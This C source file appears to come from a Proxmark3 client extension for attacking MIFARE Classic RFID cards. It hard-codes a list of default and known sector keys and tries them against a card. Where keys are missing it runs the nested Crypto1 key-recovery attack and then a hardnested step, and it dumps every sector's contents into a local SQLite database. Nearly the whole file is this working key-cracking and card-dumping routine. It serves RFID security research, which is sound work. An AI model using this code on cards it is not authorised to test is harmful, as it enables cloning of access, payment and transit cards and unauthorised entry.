//-----------------------------------------------------------------------------
// Loek Sangers and Romke van Dijk, Jan 2016
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// Definitions internal to the bump commands. Most functions are based on similarly named functinos within other files, but adapted to use our firmware commands adn to interact with a database instead of teh previously used files.
//-----------------------------------------------------------------------------



#include <stdio.h>
#include <string.h>
#include <sqlite3.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <locale.h>
#include <time.h>

#include "proxmark3.h"
#include "ui.h"
#include "cmdparser.h"
#include "util.h"
#include "iso14443crc.h"
#include "data.h"
#include "cmdhf14a.h"
#include "common.h"
#include "cmdmain.h"
#include "mifare.h"
#include "cmdhfmfu.h"
#include "cmdbump.h"
#include "bumphardnested.h"

uint64_t defaultKeys[] = {
			0xffffffffffff, // Default key (first key used by program if no user defined key)
			0x000000000000, // Blank key
			0xa0a1a2a3a4a5, // NFCForum MAD key
			0xb0b1b2b3b4b5,
			0xaabbccddeeff,
			0x4d3a99c351dd,
			0x1a982c7e459a,
			0xd3f7d3f7d3f7,
			0x714c5c886e97,
			0x587ee5f9350f,
			0xa0478cc39091,
			0x533cb6c723f6,
			0x8fd0a4f256e9
		};

void activateCard(uint64_t uid){
	PrintAndLog("activateCard");

	UsbCommand c = {CMD_BUMP_HF_ACTIVATE, {uid}};
	SendCommand(&c);

	UsbCommand resp;
	WaitForResponse(CMD_ACK,&resp);

	uint64_t status = resp.arg[0];

	switch(status){
	case 0:
		PrintAndLog("Card Selected");
		break;
	case 1:
		PrintAndLog("No Card response");
		break;
	case 2:
		PrintAndLog("UID could not be selected");
		break;
	}

}

int bumpCheckKeys (uint8_t blockNo, uint8_t keyType, uint64_t uid, uint8_t keycnt, uint8_t * keyBlock, uint64_t * key){

	*key = 0;

	UsbCommand c = {CMD_BUMP_HF_DEFAULT_KEYS, {((blockNo & 0xff) | ((keyType&0xff)<<8)), uid, keycnt}};
	memcpy(c.d.asBytes, keyBlock, 6 * keycnt);
	SendCommand(&c);

	UsbCommand resp;
	if (!WaitForResponseTimeout(CMD_ACK,&resp,3000)) return 1;
	if ((resp.arg[0] & 0xff) != 0x01) return 2;
	*key = bytes_to_num(resp.d.asBytes, 6);
	return 0;
}

void checkDefaultKeys(byte_t cardSize, uint64_t uid){
	PrintAndLog("checkDefaultKeys");

		uint8_t *keyBlock = NULL;
		uint8_t stKeyBlock = 20;

		int res;
		int	keycnt = 0;
		uint8_t blockNo = 0;
		uint8_t SectorsCnt = 1;
		uint8_t keyType = 0;
		uint64_t key64 = 0;

		keyBlock = calloc(stKeyBlock, 6);
		if (keyBlock == NULL) return ;

		int defaultKeysSize = sizeof(defaultKeys) / sizeof(uint64_t);

		for (int defaultKeyCounter = 0; defaultKeyCounter < defaultKeysSize; defaultKeyCounter++)
		{
			num_to_bytes(defaultKeys[defaultKeyCounter], 6, (uint8_t*)(keyBlock + defaultKeyCounter * 6));
		}

		blockNo = 3;
		switch(cardSize) {
			case 0: SectorsCnt =  5; break;
			case 1: SectorsCnt = 16; break;
			case 2: SectorsCnt = 32; break;
			case 4: SectorsCnt = 40; break;
			default:  SectorsCnt = 16; break;
		}

		//get both keys
		keyType = 2;
		keycnt = defaultKeysSize;

		// initialize storage for found keys
		bool validKey[2][40];
		uint8_t foundKey[2][40][6];
		for (uint16_t t = 0; t < 2; t++) {
			for (uint16_t sectorNo = 0; sectorNo < SectorsCnt; sectorNo++) {
				validKey[t][sectorNo] = false;
				for (uint16_t i = 0; i < 6; i++) {
					foundKey[t][sectorNo][i] = 0xff;
				}
			}
		}

		sqlite3 *db;
		sqlite3_stmt *sqlRes;
		int rc = sqlite3_open("cards.db", &db);

		char q[800];

		for ( int t = !keyType; t < 2; keyType==2?(t++):(t=2) ) {
			int b=blockNo;
			for (int i = 0; i < SectorsCnt; ++i) {
				PrintAndLog("--sector:%2d, block:%3d, key type:%C, key count:%2d ", i, b, t?'B':'A', keycnt);
				uint32_t max_keys = keycnt>USB_CMD_DATA_SIZE/6?USB_CMD_DATA_SIZE/6:keycnt;
				for (uint32_t c = 0; c < keycnt; c+=max_keys) {
					uint32_t size = keycnt-c>max_keys?max_keys:keycnt-c;
					res = bumpCheckKeys(b, t, uid, size, &keyBlock[6*c], &key64);
					if (res != 1) {

						snprintf(q, sizeof(q), "INSERT INTO keys (UID, block) SELECT '%08"llx"', '%3d' WHERE NOT EXISTS (\
       SELECT * FROM keys WHERE UID = '%08"llx"' AND block = '%3d');", uid, b, uid, b);

						rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

						if (rc != SQLITE_OK) {
							PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
						}
						rc = sqlite3_step(sqlRes);
						sqlite3_finalize(sqlRes);

						if (!res) {
							PrintAndLog("Found valid key:[%012"llx"]",key64);
							num_to_bytes(key64, 6, foundKey[t][i]);
							validKey[t][i] = true;

							if(t == 0){
								snprintf(q, sizeof(q), "UPDATE keys SET keyA='%012"llx"' WHERE UID='%08"llx"' AND block='%3d';", key64, uid, b);

							}else{
								snprintf(q, sizeof(q), "UPDATE keys SET keyB='%012"llx"' WHERE UID='%08"llx"' AND block='%3d';", key64, uid, b);
							}

							rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

							if (rc != SQLITE_OK) {
								PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
								//sqlite3_close(db);
							}
							rc = sqlite3_step(sqlRes);
							sqlite3_finalize(sqlRes);

						}
					} else {
						PrintAndLog("Command execute timeout");
					}
				}
				b<127?(b+=4):(b+=16);
			}
		}
		sqlite3_close(db);

		free(keyBlock);
		PrintAndLog("");

}

int checkKeySetComplete(byte_t cardSize, uint64_t uid){

	PrintAndLog("checkKeySetComplete");

	uint8_t SectorsCnt = 1;
	int num_rows;
	switch(cardSize) {
		case 0: SectorsCnt =  5; break;
		case 1: SectorsCnt = 16; break;
		case 2: SectorsCnt = 32; break;
		case 4: SectorsCnt = 40; break;
		default:  SectorsCnt = 16; break;
	}

	sqlite3 *db;
	sqlite3_stmt *sqlRes;
	int rc = sqlite3_open("cards.db", &db);

	char q[256];

	snprintf(q, sizeof(q), "SELECT Count(*) FROM keys WHERE UID='%08"llx"' AND keyA NOT NULL AND keyB NOT NULL;", uid);

	rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);
	if (rc != SQLITE_OK) {
			PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
	}
	rc = sqlite3_step(sqlRes);
	if (rc == SQLITE_ROW) {
		num_rows = (int) sqlite3_column_int(sqlRes, 0);
	}
	sqlite3_finalize(sqlRes);
	sqlite3_close(db);

	if(num_rows == SectorsCnt){
		PrintAndLog("Have all Sectors and all keys");
		return 0;
	}else{
		PrintAndLog("Have %d of %d Sectors with both keys", num_rows, SectorsCnt);
		PrintAndLog("Leaving checkKeySetComplete");
		return 1;
	}
}

uint8_t LastBlockOfSector(uint8_t sectorNo)
{
	if (sectorNo < 32) {
		return sectorNo * 4 + 3;
	} else {
		return 32 * 4 + (sectorNo - 32) * 16 + 15;
	}
}

uint8_t SectorOfBlock(uint8_t blockNo)
{
	if (blockNo < 128) {
		return blockNo / 4;
	} else {
		return 32 + (blockNo - 128) / 16;
	}
}

void getCardData(byte_t cardSize, uint64_t uid)
{
	PrintAndLog("getCardData");
	uint8_t sectorNo, blockNo;

	uint8_t keyA[40][6];
	uint8_t keyB[40][6];
	uint8_t rights[40][4];
	uint8_t carddata[256][16];
	uint8_t numSectors = 16;

	UsbCommand resp;

	switch(cardSize) {
		case 0: numSectors =  5; break;
		case 1: numSectors = 16; break;
		case 2: numSectors = 32; break;
		case 4: numSectors = 40; break;
		default:  numSectors = 16; break;
	}

	sqlite3 *db;
	sqlite3_stmt *sqlRes;
	int rc = sqlite3_open("cards.db", &db);

	char q[800];

	snprintf(q, sizeof(q), "SELECT * FROM keys WHERE UID='%08"llx"' AND keyA NOT NULL AND keyB NOT NULL;", uid);
	PrintAndLog(q);

	rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);
	if (rc != SQLITE_OK) {
		PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
	}
	rc = sqlite3_step(sqlRes);
	while (rc == SQLITE_ROW) {
		sectorNo = (int) sqlite3_column_int(sqlRes, 1);
		stringToUID(keyA[SectorOfBlock(sectorNo)], 6, sqlite3_column_text(sqlRes, 2));
		stringToUID(keyB[SectorOfBlock(sectorNo)], 6, sqlite3_column_text(sqlRes, 3));

		rc = sqlite3_step(sqlRes);
	}
	sqlite3_finalize(sqlRes);
	sqlite3_close(db);

	PrintAndLog("|-----------------------------------------|");
	PrintAndLog("|------ Reading sector access bits...-----|");
	PrintAndLog("|-----------------------------------------|");

	for (sectorNo = 0; sectorNo < numSectors; sectorNo++) {
		UsbCommand c = {CMD_BUMP_HF_READ_BLOCK, {FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 0, uid}};
		memcpy(c.d.asBytes, keyA[sectorNo], 6);
		SendCommand(&c);

		if (WaitForResponseTimeout(CMD_ACK,&resp,1500)) {
			uint8_t isOK  = resp.arg[0] & 0xff;
			uint8_t *data  = resp.d.asBytes;
			if (isOK){
				rights[sectorNo][0] = ((data[7] & 0x10)>>2) | ((data[8] & 0x1)<<1) | ((data[8] & 0x10)>>4); // C1C2C3 for data area 0
				rights[sectorNo][1] = ((data[7] & 0x20)>>3) | ((data[8] & 0x2)<<0) | ((data[8] & 0x20)>>5); // C1C2C3 for data area 1
				rights[sectorNo][2] = ((data[7] & 0x40)>>4) | ((data[8] & 0x4)>>1) | ((data[8] & 0x40)>>6); // C1C2C3 for data area 2
				rights[sectorNo][3] = ((data[7] & 0x80)>>5) | ((data[8] & 0x8)>>2) | ((data[8] & 0x80)>>7); // C1C2C3 for sector trailer
			} else {
				PrintAndLog("Could not get access rights for sector %2d. Trying with defaults...", sectorNo);
				rights[sectorNo][0] = rights[sectorNo][1] = rights[sectorNo][2] = 0x00;
				rights[sectorNo][3] = 0x01;
			}
		} else {
			PrintAndLog("Command execute timeout when trying to read access rights for sector %2d. Trying with defaults...", sectorNo);
			rights[sectorNo][0] = rights[sectorNo][1] = rights[sectorNo][2] = 0x00;
			rights[sectorNo][3] = 0x01;
		}
	}

	PrintAndLog("|-----------------------------------------|");
	PrintAndLog("|---------- Reading all blocks. ----------|");
	PrintAndLog("|-----------------------------------------|");

	for (sectorNo = 0; sectorNo < numSectors; sectorNo++) {
		for (blockNo = 0; blockNo < NumBlocksPerSector(sectorNo); blockNo++) {
			bool received = false;

			if (blockNo == NumBlocksPerSector(sectorNo) - 1) {		// sector trailer. At least the Access Conditions can always be read with key A.
				UsbCommand c = {CMD_BUMP_HF_READ_BLOCK, {FirstBlockOfSector(sectorNo) + blockNo, 0, uid}};
				memcpy(c.d.asBytes, keyA[sectorNo], 6);
				SendCommand(&c);
				received = WaitForResponseTimeout(CMD_ACK,&resp,1500);
			} else {												// data block. Check if it can be read with key A or key B
				uint8_t data_area = sectorNo<32?blockNo:blockNo/5;
				if ((rights[sectorNo][data_area] == 0x03) || (rights[sectorNo][data_area] == 0x05)) {	// only key B would work
					UsbCommand c = {CMD_BUMP_HF_READ_BLOCK, {FirstBlockOfSector(sectorNo) + blockNo, 1, uid}};
					memcpy(c.d.asBytes, keyB[sectorNo], 6);
					SendCommand(&c);
					received = WaitForResponseTimeout(CMD_ACK,&resp,1500);
				} else if (rights[sectorNo][data_area] == 0x07) {										// no key would work
					PrintAndLog("Access rights do not allow reading of sector %2d block %3d", sectorNo, blockNo);
				} else {																				// key A would work
					UsbCommand c = {CMD_BUMP_HF_READ_BLOCK, {FirstBlockOfSector(sectorNo) + blockNo, 0, uid}};
					memcpy(c.d.asBytes, keyA[sectorNo], 6);
					SendCommand(&c);
					received = WaitForResponseTimeout(CMD_ACK,&resp,1500);
				}
			}

			if (received) {
				uint8_t *data  = resp.d.asBytes;
				if (blockNo == NumBlocksPerSector(sectorNo) - 1) {		// sector trailer. Fill in the keys.
					data[0]  = (keyA[sectorNo][0]);
					data[1]  = (keyA[sectorNo][1]);
					data[2]  = (keyA[sectorNo][2]);
					data[3]  = (keyA[sectorNo][3]);
					data[4]  = (keyA[sectorNo][4]);
					data[5]  = (keyA[sectorNo][5]);
					data[10] = (keyB[sectorNo][0]);
					data[11] = (keyB[sectorNo][1]);
					data[12] = (keyB[sectorNo][2]);
					data[13] = (keyB[sectorNo][3]);
					data[14] = (keyB[sectorNo][4]);
					data[15] = (keyB[sectorNo][5]);
				}
				if (resp.arg[0] & 0xff) {
					memcpy(carddata[FirstBlockOfSector(sectorNo) + blockNo], data, 16);
                    PrintAndLog("Successfully read block %2d of sector %2d.", blockNo, sectorNo);

				} else {
					PrintAndLog("Could not read block %2d of sector %2d", blockNo, sectorNo);
					break;
				}
			}
			else {
				PrintAndLog("Command execute timeout when trying to read block %2d of sector %2d.", blockNo, sectorNo);
				break;
			}
		}
	}

	char data[513];
	rc = sqlite3_open("cards.db", &db);

	for (sectorNo = 0; sectorNo < numSectors; sectorNo++) {

		if(sectorNo < 32){
			for(int i = 0; i < 64; i++){
				snprintf(data + i*2, 4, "%02x", carddata[FirstBlockOfSector(sectorNo)][i]);
			}
			snprintf(q, sizeof(q), "UPDATE keys SET data='%s' WHERE UID='%08"llx"' AND block='%3d';", data, uid, LastBlockOfSector(sectorNo));
			PrintAndLog(q);
		}else{
			for(int i = 0; i < 256; i++){
				snprintf(data + i*2, 4, "%02x", carddata[FirstBlockOfSector(sectorNo)][i]);
			}
			snprintf(q, sizeof(q), "UPDATE keys SET data='%s' WHERE UID='%08"llx"' AND block='%3d';", data, uid, LastBlockOfSector(sectorNo));
			PrintAndLog(q);

		}

				rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

				if (rc != SQLITE_OK) {
					PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
				}
				rc = sqlite3_step(sqlRes);
				sqlite3_finalize(sqlRes);
	}
	sqlite3_close(db);

}

int bumpNested(uint64_t carduid, uint8_t blockNo, uint8_t keyType, uint8_t * key, uint8_t trgBlockNo, uint8_t trgKeyType, uint8_t * resultKey, bool calibrate)
{

	uint16_t i;
	uint32_t uid;
	UsbCommand resp;

	StateList_t statelists[2];
	struct Crypto1State *p1, *p2, *p3, *p4;

	// flush queue
	WaitForResponseTimeout(CMD_ACK, NULL, 100);

	uint8_t *tmp[4];

	num_to_bytes(carduid, 4, tmp);

	UsbCommand c = {CMD_BUMP_NESTED, {blockNo + keyType * 0x100, trgBlockNo + trgKeyType * 0x100, calibrate}};
	memcpy(c.d.asBytes, key, 6);
	memcpy(c.d.asBytes + 6, tmp, 4);
	SendCommand(&c);

	if (!WaitForResponseTimeout(CMD_ACK, &resp, 1500)) {
		return -1;
	}

	if (resp.arg[0]) {
		return resp.arg[0];  // error during nested
	}

	memcpy(&uid, resp.d.asBytes, 4);
	PrintAndLog("uid:%08x trgbl=%d trgkey=%x", uid, (uint16_t)resp.arg[2] & 0xff, (uint16_t)resp.arg[2] >> 8);

	for (i = 0; i < 2; i++) {
		statelists[i].blockNo = resp.arg[2] & 0xff;
		statelists[i].keyType = (resp.arg[2] >> 8) & 0xff;
		statelists[i].uid = uid;
		memcpy(&statelists[i].nt,  (void *)(resp.d.asBytes + 4 + i * 8 + 0), 4);
		memcpy(&statelists[i].ks1, (void *)(resp.d.asBytes + 4 + i * 8 + 4), 4);
	}

	// calc keys

	pthread_t thread_id[2];

	// create and run worker threads
	for (i = 0; i < 2; i++) {
		pthread_create(thread_id + i, NULL, nested_worker_thread, &statelists[i]);
	}

	// wait for threads to terminate:
	for (i = 0; i < 2; i++) {
		pthread_join(thread_id[i], (void*)&statelists[i].head.slhead);
	}


	// the first 16 Bits of the cryptostate already contain part of our key.
	// Create the intersection of the two lists based on these 16 Bits and
	// roll back the cryptostate
	p1 = p3 = statelists[0].head.slhead;
	p2 = p4 = statelists[1].head.slhead;
	while (p1 <= statelists[0].tail.sltail && p2 <= statelists[1].tail.sltail) {
		if (Compare16Bits(p1, p2) == 0) {
			struct Crypto1State savestate, *savep = &savestate;
			savestate = *p1;
			while(Compare16Bits(p1, savep) == 0 && p1 <= statelists[0].tail.sltail) {
				*p3 = *p1;
				lfsr_rollback_word(p3, statelists[0].nt ^ statelists[0].uid, 0);
				p3++;
				p1++;
			}
			savestate = *p2;
			while(Compare16Bits(p2, savep) == 0 && p2 <= statelists[1].tail.sltail) {
				*p4 = *p2;
				lfsr_rollback_word(p4, statelists[1].nt ^ statelists[1].uid, 0);
				p4++;
				p2++;
			}
		}
		else {
			while (Compare16Bits(p1, p2) == -1) p1++;
			while (Compare16Bits(p1, p2) == 1) p2++;
		}
	}
	p3->even = 0; p3->odd = 0;
	p4->even = 0; p4->odd = 0;
	statelists[0].len = p3 - statelists[0].head.slhead;
	statelists[1].len = p4 - statelists[1].head.slhead;
	statelists[0].tail.sltail=--p3;
	statelists[1].tail.sltail=--p4;

	// the statelists now contain possible keys. The key we are searching for must be in the
	// intersection of both lists. Create the intersection:
	qsort(statelists[0].head.keyhead, statelists[0].len, sizeof(uint64_t), compar_int);
	qsort(statelists[1].head.keyhead, statelists[1].len, sizeof(uint64_t), compar_int);

	uint64_t *p5, *p6, *p7;
	p5 = p7 = statelists[0].head.keyhead;
	p6 = statelists[1].head.keyhead;
	while (p5 <= statelists[0].tail.keytail && p6 <= statelists[1].tail.keytail) {
		if (compar_int(p5, p6) == 0) {
			*p7++ = *p5++;
			p6++;
		}
		else {
			while (compar_int(p5, p6) == -1) p5++;
			while (compar_int(p5, p6) == 1) p6++;
		}
	}
	statelists[0].len = p7 - statelists[0].head.keyhead;
	statelists[0].tail.keytail=--p7;

	memset(resultKey, 0, 6);
	// The list may still contain several key candidates. Test each of them with mfCheckKeys
	for (i = 0; i < statelists[0].len; i++) {
		uint8_t keyBlock[6];
		uint64_t key64;
		crypto1_get_lfsr(statelists[0].head.slhead + i, &key64);
		num_to_bytes(key64, 6, keyBlock);
		key64 = 0;
		if (!bumpCheckKeys(statelists[0].blockNo, statelists[0].keyType, carduid, 1, keyBlock, &key64)) {
			num_to_bytes(key64, 6, resultKey);
			break;
		}
	}

	free(statelists[0].head.slhead);
	free(statelists[1].head.slhead);

	return 0;
}

void performNestedAttack(byte_t cardSize, uint64_t uid){
	PrintAndLog("performNestedAttack");

		int i, res, iterations;
		sector *e_sector = NULL;
		uint8_t blockNo = 0;
		uint8_t keyType = 0;
		uint8_t trgBlockNo = 0;
		uint8_t trgKeyType = 0;
		uint8_t SectorsCnt = 0;
		uint8_t key[6] = {0, 0, 0, 0, 0, 0};
		uint64_t key64 = 0;

		uint8_t standart[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
		uint8_t tempkey[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

		uint8_t resultKey[6];

// ------------------------------------  multiple sectors working
		clock_t time1;
		time1 = clock();

		switch(cardSize) {
			case 0: SectorsCnt =  5; break;
			case 1: SectorsCnt = 16; break;
			case 2: SectorsCnt = 32; break;
			case 4: SectorsCnt = 40; break;
			default:  SectorsCnt = 16; break;
		}

		e_sector = calloc(SectorsCnt, sizeof(sector));
		if (e_sector == NULL) return;

		sqlite3 *db;
		sqlite3_stmt *sqlRes;
		int rc = sqlite3_open("cards.db", &db);
		char q[1024];
		uint8_t keyA[6], keyB[6];
		bool first = TRUE;

		PrintAndLog("Loading db keys");
		for (i = 0; i < SectorsCnt; i++) {
				snprintf(q, sizeof(q), "SELECT * FROM keys WHERE UID='%08"llx"' AND block = '%3d';", uid, LastBlockOfSector(i));

				rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);
				if (rc != SQLITE_OK) {
					PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
				}
				rc = sqlite3_step(sqlRes);

				if (rc == SQLITE_ROW) {
					e_sector[i].foundKey[0] = sqlite3_column_type(sqlRes, 2) != 5;// 5 -> null type
					e_sector[i].foundKey[1] = sqlite3_column_type(sqlRes, 3) != 5;

					if(e_sector[i].foundKey[0]){
						stringToUID(keyA, 6, sqlite3_column_text(sqlRes, 2));
						e_sector[i].Key[0] = bytes_to_num(keyA, 6);

						if(first){
							blockNo = LastBlockOfSector(i);
							memcpy(key, keyA, 6);
							keyType = 0;

							first = FALSE;
						}
					}

					if(e_sector[i].foundKey[1]){
						stringToUID(keyB, 6, sqlite3_column_text(sqlRes, 3));
						e_sector[i].Key[1] = bytes_to_num(keyB, 6);

						if(first){
							blockNo = LastBlockOfSector(i);
							memcpy(key, keyB, 6);
							keyType = 1;

							first = FALSE;
						}
					}

				}
				sqlite3_finalize(sqlRes);
		}
		sqlite3_close(db);

		if(first) return;

		// nested sectors
		iterations = 0;
		PrintAndLog("nested...");
		bool calibrate = true;
		for (i = 0; i < NESTED_SECTOR_RETRY; i++) {
			for (uint8_t sectorNo = 0; sectorNo < SectorsCnt; sectorNo++) {
				for (trgKeyType = 0; trgKeyType < 2; trgKeyType++) {
					if (e_sector[sectorNo].foundKey[trgKeyType]) continue;
					int16_t isOK = bumpNested(uid, blockNo, keyType, key, FirstBlockOfSector(sectorNo), trgKeyType, resultKey, calibrate);
					if(isOK) {
						switch (isOK) {
							case -1 : PrintAndLog("Error: No response from Proxmark.\n"); break;
							case -2 : PrintAndLog("Button pressed. Aborted.\n"); break;
							case -3 : PrintAndLog("Tag isn't vulnerable to Nested Attack (random numbers are not predictable).\n"); break;
							default : PrintAndLog("Unknown Error.\n"); break;
						}
						free(e_sector);
						return ;
					} else {
						calibrate = false;
					}

					iterations++;

					key64 = bytes_to_num(resultKey, 6);
					if (key64) {
						PrintAndLog("Found valid key:%012"llx, key64);
						e_sector[sectorNo].foundKey[trgKeyType] = 1;
						e_sector[sectorNo].Key[trgKeyType] = key64;
					}
				}
			}
		}

		rc = sqlite3_open("cards.db", &db);

		for (uint8_t sectorNo = 0; sectorNo < SectorsCnt; sectorNo++) {
			if(e_sector[sectorNo].foundKey[0]){
				snprintf(q, sizeof(q), "UPDATE keys SET keyA='%012"llx"' WHERE UID='%08"llx"' AND block='%3d';", e_sector[sectorNo].Key[0], uid, LastBlockOfSector(sectorNo));
			}
			rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

			if (rc != SQLITE_OK) {
				PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
			}
			rc = sqlite3_step(sqlRes);
			sqlite3_finalize(sqlRes);

			if(e_sector[sectorNo].foundKey[1]){
				snprintf(q, sizeof(q), "UPDATE keys SET keyB='%012"llx"' WHERE UID='%08"llx"' AND block='%3d';", e_sector[sectorNo].Key[1], uid, LastBlockOfSector(sectorNo));
			}

			rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

			if (rc != SQLITE_OK) {
				PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
			}
			rc = sqlite3_step(sqlRes);
			sqlite3_finalize(sqlRes);

		}
		sqlite3_close(db);

		printf("Time in nested: %1.3f (%1.3f sec per key)\n\n", ((float)clock() - time1)/CLOCKS_PER_SEC, ((float)clock() - time1)/iterations/CLOCKS_PER_SEC);

		PrintAndLog("-----------------------------------------------\nIterations count: %d\n\n", iterations);

		//print them
		PrintAndLog("|---|----------------|---|----------------|---|");
		PrintAndLog("|sec|key A           |res|key B           |res|");
		PrintAndLog("|---|----------------|---|----------------|---|");
		for (i = 0; i < SectorsCnt; i++) {
			PrintAndLog("|%03d|  %012"llx"  | %d |  %012"llx"  | %d |", i,
				e_sector[i].Key[0], e_sector[i].foundKey[0], e_sector[i].Key[1], e_sector[i].foundKey[1]);
		}
		PrintAndLog("|---|----------------|---|----------------|---|");


		free(e_sector);
}



void dataDumpComplete(byte_t cardSize, uint64_t uid){
	PrintAndLog("dataDumpComplete");

		uint8_t SectorsCnt = 1;
		int num_rows;
		switch(cardSize) {
			case 0: SectorsCnt =  5; break;
			case 1: SectorsCnt = 16; break;
			case 2: SectorsCnt = 32; break;
			case 4: SectorsCnt = 40; break;
			default:  SectorsCnt = 16; break;
		}

		sqlite3 *db;
		sqlite3_stmt *sqlRes;
		int rc = sqlite3_open("cards.db", &db);

		char q[200];

		snprintf(q, sizeof(q), "SELECT Count(*) FROM keys WHERE UID='%08"llx"' AND keyA NOT NULL AND keyB NOT NULL AND data NOT NULL;", uid);

		rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);
		if (rc != SQLITE_OK) {
				PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
		}
		rc = sqlite3_step(sqlRes);
		if (rc == SQLITE_ROW) {
			num_rows = (int) sqlite3_column_int(sqlRes, 0);
		}
		sqlite3_finalize(sqlRes);

		if(num_rows == SectorsCnt){
			PrintAndLog("Have complete card dump!");

			snprintf(q, sizeof(q), "UPDATE cards SET done=1 WHERE UID='%08"llx"';", uid);

			rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);

			if (rc != SQLITE_OK) {
					PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
			}
			rc = sqlite3_step(sqlRes);
			sqlite3_finalize(sqlRes);
		}else{
			PrintAndLog("Have %d of %d Sectors with both keys and data", num_rows, SectorsCnt);
		}

		sqlite3_close(db);
}

void attackMifareClassic(uint64_t uid, byte_t cardSize){
	PrintAndLog("TIME_START_attackMifareClassic: %d", (int) time(NULL));

	PrintAndLog("TIME_START_activateCard: %d", (int) time(NULL));
	activateCard(uid);
	PrintAndLog("TIME_STOP_activateCard: %d", (int) time(NULL));

	PrintAndLog("TIME_START_checkDefaultKeys: %d", (int) time(NULL));
	checkDefaultKeys(cardSize, uid);
	PrintAndLog("TIME_STOP_checkDefaultKeys: %d", (int) time(NULL));

	//check have 1 key?
	//no -> darkside

	if(checkKeySetComplete(cardSize, uid) == 0){
		PrintAndLog("Got All Keys! (by default)");

		PrintAndLog("TIME_START_getCardData: %d", (int) time(NULL));
		getCardData(cardSize, uid);
		PrintAndLog("TIME_STOP_getCardData: %d", (int) time(NULL));

		dataDumpComplete(cardSize, uid);
		return;
	}

	PrintAndLog("TIME_START_performNestedAttack: %d", (int) time(NULL));
	performNestedAttack(cardSize, uid);
	PrintAndLog("TIME_STOP_performNestedAttack: %d", (int) time(NULL));

	if(checkKeySetComplete(cardSize, uid) == 0){

		PrintAndLog("TIME_START_getCardData: %d", (int) time(NULL));
		getCardData(cardSize, uid);
		PrintAndLog("TIME_STOP_getCardData: %d", (int) time(NULL));

		dataDumpComplete(cardSize, uid);

		return;
	}

	PrintAndLog("TIME_START_bumpnestedhard: %d", (int) time(NULL));
	bumpnestedhard(cardSize, uid);
	PrintAndLog("TIME_STOP_bumpnestedhard: %d", (int) time(NULL));

	PrintAndLog("TIME_STOP_attackMifareClassic: %d", (int) time(NULL));
}

